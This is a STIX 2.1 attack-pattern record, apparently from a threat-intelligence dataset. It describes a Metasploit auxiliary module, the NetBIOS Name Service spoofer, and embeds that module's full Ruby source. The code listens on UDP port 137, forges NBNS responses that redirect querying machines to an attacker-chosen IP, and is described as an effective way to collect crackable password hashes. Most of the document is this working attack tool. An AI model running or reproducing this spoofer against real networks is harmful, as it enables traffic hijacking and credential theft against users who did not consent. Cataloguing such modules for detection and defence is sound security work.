{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c6d7e4b-ae4d-482d-8b69-d2fb01e1b84d",
    "created": "2024-08-14T16:32:54.997646Z",
    "modified": "2024-08-14T16:32:54.997649Z",
    "name": "NetBIOS Name Service Spoofer",
    "description": " This module forges NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests sent to the local subnet's broadcast address and spoof a response, redirecting the querying machine to an IP of the attacker's choosing. Combined with auxiliary/server/capture/smb or auxiliary/server/capture/http_ntlm it is a highly effective means of collecting crackable hashes on common networks.  This module must be run as root and will bind to udp/137 on all interfaces. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/nbns/nbns_response.rb",
            "external_id": "nbns_response.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n\n  attr_accessor :sock, :thread\n\n\n  def initialize\n    super(\n      'Name'           => 'NetBIOS Name Service Spoofer',\n      'Description'    => %q{\n          This module forges NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests\n          sent to the local subnet's broadcast address and spoof a response, redirecting the querying\n          machine to an IP of the attacker's choosing. Combined with auxiliary/server/capture/smb or\n          auxiliary/server/capture/http_ntlm it is a highly effective means of collecting crackable hashes on\n          common networks.\n\n          This module must be run as root and will bind to udp/137 on all interfaces.\n      },\n      'Author'     => [ 'Tim Medin <tim[at]securitywhole.com>' ],\n      'License'    => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'URL', 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html' ]\n        ],\n      'Actions'\t\t=>\n        [\n          [ 'Service', 'Description' => 'Run NBNS spoofing service' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service'\n    )\n\n    register_options([\n      OptAddress.new('SPOOFIP', [ true, \"IP address with which to poison responses\", \"127.0.0.1\"]),\n      OptRegexp.new('REGEX', [ true, \"Regex applied to the NB Name to determine if spoofed reply is sent\", '.*']),\n    ])\n\n    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')\n    self.thread = nil\n    self.sock = nil\n  end\n\n  def dispatch_request(packet, rhost, src_port)\n    rhost = ::IPAddr.new(rhost)\n    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped\n    # addr like \"::ffff:192.168.0.1\" when the interface we're listening\n    # on has an IPv6 address. Convert it to just the v4 addr\n    if rhost.ipv4_mapped?\n      rhost = rhost.native\n    end\n\n    # Convert to string\n    rhost = rhost.to_s\n\n    spoof = ::IPAddr.new(datastore['SPOOFIP'])\n\n    return if packet.length == 0\n\n    nbnsq_transid      = packet[0..1]\n    nbnsq_flags        = packet[2..3]\n    nbnsq_questions    = packet[4..5]\n    nbnsq_answerrr     = packet[6..7]\n    nbnsq_authorityrr  = packet[8..9]\n    nbnsq_additionalrr = packet[10..11]\n    nbnsq_name         = packet[12..45]\n    decoded = \"\"\n    nbnsq_name.slice(1..-2).each_byte do |c|\n      decoded << \"#{(c - 65).to_s(16)}\"\n    end\n    nbnsq_decodedname = \"#{[decoded].pack('H*')}\".strip()\n    nbnsq_type         = packet[46..47]\n    nbnsq_class        = packet[48..49]\n\n    return unless nbnsq_decodedname =~ /#{datastore['REGEX'].source}/i\n\n    print_good(\"#{rhost.ljust 16} nbns - #{nbnsq_decodedname} matches regex, responding with #{spoof}\")\n\n    vprint_status(\"transid:        #{nbnsq_transid.unpack('H4')}\")\n    vprint_status(\"tlags:          #{nbnsq_flags.unpack('B16')}\")\n    vprint_status(\"questions:      #{nbnsq_questions.unpack('n')}\")\n    vprint_status(\"answerrr:       #{nbnsq_answerrr.unpack('n')}\")\n    vprint_status(\"authorityrr:    #{nbnsq_authorityrr.unpack('n')}\")\n    vprint_status(\"additionalrr:   #{nbnsq_additionalrr.unpack('n')}\")\n    vprint_status(\"name:           #{nbnsq_name} #{nbnsq_name.unpack('H34')}\")\n    vprint_status(\"full name:      #{nbnsq_name.slice(1..-2)}\")\n    vprint_status(\"decoded:        #{decoded}\")\n    vprint_status(\"decoded name:   #{nbnsq_decodedname}\")\n    vprint_status(\"type:           #{nbnsq_type.unpack('n')}\")\n    vprint_status(\"class:          #{nbnsq_class.unpack('n')}\")\n\n    # time to build a response packet - Oh YEAH!\n    response = nbnsq_transid +\n      \"\\x85\\x00\" + # Flags = response + authoratative + recursion desired +\n      \"\\x00\\x00\" + # Questions = 0\n      \"\\x00\\x01\" + # Answer RRs = 1\n      \"\\x00\\x00\" + # Authority RRs = 0\n      \"\\x00\\x00\" + # Additional RRs = 0\n      nbnsq_name + # original query name\n      nbnsq_type + # Type = NB ...whatever that means\n      nbnsq_class+ # Class = IN\n      \"\\x00\\x04\\x93\\xe0\" + # TTL = a long ass time\n      \"\\x00\\x06\" + # Datalength = 6\n      \"\\x00\\x00\" + # Flags B-node, unique = whatever that means\n      spoof.hton\n\n    pkt = PacketFu::UDPPacket.new\n    pkt.ip_saddr = Rex::Socket.source_address(rhost)\n    pkt.ip_daddr = rhost\n    pkt.ip_ttl = 255\n    pkt.udp_sport = 137\n    pkt.udp_dport = src_port\n    pkt.payload = response\n    pkt.recalc\n\n    capture_sendto(pkt, rhost)\n  end\n\n  def monitor_socket\n    while true\n      rds = [self.sock]\n      wds = []\n      eds = [self.sock]\n\n      r,_,_ = ::IO.select(rds,wds,eds,0.25)\n      if (r != nil and r[0] == self.sock)\n        packet, host, port = self.sock.recvfrom(65535)\n        dispatch_request(packet, host, port)\n      end\n    end\n  end\n\n  def run\n    check_pcaprub_loaded()\n    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround\n\n    # Avoid receiving extraneous traffic on our send socket\n    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})\n\n    self.sock = Rex::Socket.create_udp(\n      'LocalHost' => \"0.0.0.0\",\n      'LocalPort' => 137,\n      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }\n    )\n    add_socket(self.sock)\n    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)\n\n    self.thread = Rex::ThreadFactory.spawn(\"NBNSServerMonitor\", false) {\n      begin\n        monitor_socket\n      rescue ::Interrupt\n        raise $!\n      rescue ::Exception\n        print_error(\"Error: #{$!.class} #{$!} #{$!.backtrace}\")\n      end\n    }\n\n    print_status(\"NBNS Spoofer started. Listening for NBNS requests with REGEX \\\"#{datastore['REGEX'].source}\\\" ...\")\n\n    self.thread.join\n    print_status(\"NBNS Monitor thread exited...\")\n  end\n\n  def cleanup\n    if self.thread and self.thread.alive?\n      self.thread.kill\n      self.thread = nil\n    end\n    self.sock.close\n    close_pcap\n  end\nend\n"
}